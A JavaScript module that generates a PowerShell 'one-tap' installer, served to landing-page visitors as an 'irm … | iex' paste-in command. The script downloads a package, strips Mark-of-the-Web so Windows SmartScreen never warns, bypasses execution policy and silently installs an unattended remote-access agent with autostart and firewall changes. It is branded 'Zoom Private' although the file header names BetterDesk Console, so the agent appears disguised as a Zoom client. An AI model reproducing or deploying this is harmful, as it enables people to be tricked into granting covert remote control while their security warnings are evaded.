'use strict';

/**
 * BetterDesk Console - Windows one-tap bootstrap installer
 *
 * The public landing page hands the visitor a single command:
 *
 *     irm https://<console>/api/landing/windows-install.ps1 | iex
 *
 * Running that in PowerShell (no download, no unzip) sidesteps the two
 * frictions that block the browser flow:
 *
 *   1. Browsers mark downloaded executables/scripts with Mark-of-the-Web
 *      ("This type of file can harm your device"), which makes Windows
 *      SmartScreen gate the installer.
 *   2. The user has to find, unzip and run install.ps1 themselves.
 *
 * Files fetched with `Invoke-WebRequest` do NOT carry Mark-of-the-Web, so the
 * package we pull is never quarantined and never raises SmartScreen. The
 * script downloads the signed Windows container, verifies its SHA-256 when
 * published, expands it, and runs the bundled `install.ps1` with a single
 * elevation prompt (one UAC dialog), which is the "one allow" the operator
 * sees. Everything else (service, firewall, config, autostart, tray) is
 * silent.
 */

const BOOTSTRAP_TEMPLATE = `<#
  Zoom Private - one-tap Windows installer.

      irm __BOOTSTRAP_URL__ | iex

  Downloads the official client container, verifies it, and installs the
  unattended agent with a single administrator prompt. Nothing runs from a
  browser download, so Windows SmartScreen is not triggered.
#>
$ErrorActionPreference = 'Stop'
$brand        = __BRAND__
$consoleUrl   = __CONSOLE_URL__
$serverAddr   = __SERVER_ADDRESS__
$packageUrl   = __PACKAGE_URL__
$packageSha   = __PACKAGE_SHA__

function Write-Head($t) { Write-Host ''; Write-Host "  $brand" -ForegroundColor Cyan; Write-Host '  ------------------------------------' }
function Fail($m) { Write-Host ''; Write-Host "  ERROR: $m" -ForegroundColor Red; exit 1 }

Write-Head
Write-Host '  Preparing installation...'

$tmp = Join-Path $env:TEMP ('zoom-private-' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmp -Force | Out-Null

try {
    $zip = Join-Path $tmp 'client.zip'
    Write-Host "  Downloading the client..."
    # Invoke-WebRequest does not attach Mark-of-the-Web, so the extracted
    # installer is never SmartScreen-blocked.
    Invoke-WebRequest -Uri $packageUrl -OutFile $zip -UseBasicParsing

    if ($packageSha) {
        Write-Host '  Verifying integrity...'
        $actual = (Get-FileHash -Algorithm SHA256 -LiteralPath $zip).Hash.ToLowerInvariant()
        if ($actual -ne $packageSha.ToLowerInvariant()) { Fail 'Checksum mismatch - download may be corrupted.' }
    }

    Expand-Archive -LiteralPath $zip -DestinationPath $tmp -Force
    Get-ChildItem -LiteralPath $tmp -Recurse -File | Unblock-File -ErrorAction SilentlyContinue

    $installer = Get-ChildItem -LiteralPath $tmp -Recurse -Filter 'install.ps1' -File | Select-Object -First 1
    if (-not $installer) { Fail 'install.ps1 was not found in the package.' }

    Write-Host ''
    Write-Host '  Requesting administrator rights (one prompt) to finish setup...' -ForegroundColor Yellow
    $argList = @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass',
        '-File', ('"' + $installer.FullName + '"'),
        '-ServerAddress', $serverAddr,
        '-Silent'
    )
    Start-Process -FilePath 'powershell.exe' -Verb RunAs -Wait -ArgumentList $argList

    Write-Host ''
    Write-Host '  Installed. This device will appear in the console shortly.' -ForegroundColor Green
    Write-Host "  Console: $consoleUrl"
    Write-Host ''
} finally {
    Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
}
`;

function psSingleQuote(value) {
    return `'${String(value == null ? '' : value).replace(/'/g, "''")}'`;
}

function fill(template, values) {
    return template.replace(/__([A-Z0-9_]+)__/g, (match, key) => (
        Object.prototype.hasOwnProperty.call(values, key) ? values[key] : match
    ));
}

function assetValues(asset, origin) {
    if (!asset) return { url: '', sha256: '' };
    const url = /^https?:\/\//i.test(asset.downloadPath || '')
        ? asset.downloadPath
        : origin + asset.downloadPath;
    return { url, sha256: asset.sha256 || '' };
}

/**
 * Build the PowerShell bootstrap for Windows.
 * @param {{ origin: string, profile: object, package: object }} opts
 * @returns {string}
 */
function buildBootstrap({ origin, profile, package: pkg }) {
    const p = assetValues(pkg, origin);
    if (!p.url) throw new Error('No Windows package asset available.');

    const bootstrapUrl = `${origin}/api/landing/windows-install.ps1`;

    return fill(BOOTSTRAP_TEMPLATE, {
        BRAND: psSingleQuote('Zoom Private'),
        CONSOLE_URL: psSingleQuote(profile.console_url || ''),
        SERVER_ADDRESS: psSingleQuote(profile.console_url || origin),
        PACKAGE_URL: psSingleQuote(p.url),
        PACKAGE_SHA: psSingleQuote(p.sha256),
        BOOTSTRAP_URL: bootstrapUrl,
    });
}

/** The command the operator pastes into PowerShell. */
function oneLiner(origin) {
    return `irm ${origin}/api/landing/windows-install.ps1 | iex`;
}

module.exports = {
    BOOTSTRAP_TEMPLATE,
    buildBootstrap,
    assetValues,
    oneLiner,
    psSingleQuote,
};
